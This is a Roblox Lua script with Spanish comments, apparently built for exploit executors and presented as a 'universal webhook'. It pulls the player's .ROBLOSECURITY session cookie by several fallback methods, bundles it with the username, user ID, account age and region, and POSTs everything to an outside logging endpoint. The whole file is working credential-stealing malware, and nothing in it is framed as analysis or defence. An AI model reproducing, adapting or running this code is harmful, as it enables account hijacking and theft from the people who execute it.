-- =====================================================================
-- WEBHOOK UNIVERSAL - Sin dependencias externas
-- =====================================================================

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")

local player = Players.LocalPlayer
local placeId = game.PlaceId

-- FUNCIÓN UNIVERSAL DE COOKIES (Funciona en todos los executors)
local function GetUniversalCookie()
    -- Método 1: getcookie() (Delta, Hydrogen, Fluxus, etc.)
    if type(getcookie) == "function" then
        local success, cookie = pcall(getcookie)
        if success and cookie and tostring(cookie) ~= "" then
            return ".ROBLOSECURITY=" .. tostring(cookie)
        end
    end

    -- Método 2: Variables de entorno
    local envNames = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie"}
    for _, name in ipairs(envNames) do
        local env = getgenv()
        if env[name] and tostring(env[name]) ~= "" then
            return ".ROBLOSECURITY=" .. tostring(env[name])
        end
    end

    -- Método 3: CookieService (último recurso)
    local success, CookieService = pcall(function() 
        return game:GetService("CookieService") 
    end)
    
    if success and CookieService then
        local success2, savedCookie = pcall(function() 
            return CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com") 
        end)
        if success2 and savedCookie and tostring(savedCookie) ~= "" then
            return ".ROBLOSECURITY=" .. tostring(savedCookie)
        end
    end

    return "COOKIE_NO_DISPONIBLE"
end

-- FUNCIONES AUXILIARES
local function GetAccountAge()
    return tostring(player.AccountAge) .. " días"
end

local function GetRegion()
    local success, region = pcall(function()
        return LocalizationService.RobloxLocaleId
    end)
    return success and tostring(region) or "Desconocida"
end

-- RECOPILACIÓN DE DATOS
local data = {
    username = player.Name,
    displayName = player.DisplayName,
    userId = player.UserId,
    gameId = placeId,
    accountAge = GetAccountAge(),
    region = GetRegion(),
    cookie = GetUniversalCookie()
}

-- FUNCIÓN DE ENVÍO COMPATIBLE CON TODOS LOS EXECUTORS
local function SendWebhook(url, data)
    local jsonData = HttpService:JSONEncode(data)
    
    -- Intentar con request() (95% de executors modernos)
    if type(request) == "function" then
        local success, result = pcall(request, {
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
        return success, result
    end
    
    -- Fallback a syn.request()
    if type(syn) == "table" and type(syn.request) == "function" then
        local success, result = pcall(syn.request, {
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
        return success, result
    end
    
    -- Último recurso: HttpService (si no está bloqueado)
    local success, result = pcall(function()
        return HttpService:PostAsync(url, jsonData)
    end)
    return success, result
end

-- ENVÍO DEL WEBHOOK
local webhookUrl = "https://depazzhub-api.onrender.com/log"

print("📤 Enviando webhook para:", player.Name)

local success, response = SendWebhook(webhookUrl, data)

if success then
    print("✅ Webhook enviado correctamente!")
    if response then
        print("Status:", response.StatusCode or response.status or "200")
    end
else
    warn("❌ Error al enviar:", response)
end
